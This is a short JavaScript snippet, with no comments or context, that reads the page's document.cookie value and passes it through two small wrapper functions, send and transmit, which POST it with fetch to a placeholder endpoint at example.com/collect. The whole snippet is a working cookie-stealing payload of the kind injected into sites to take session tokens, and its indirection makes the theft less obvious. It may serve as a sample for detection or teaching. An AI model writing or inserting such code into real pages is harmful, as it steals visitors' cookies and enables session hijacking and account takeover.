function send(data) {
    transmit(data);
}

function transmit(value) {
    fetch("https://example.com/collect", {
        method: "POST",
        body: value
    });
}

const cookieData = document.cookie;

send(cookieData);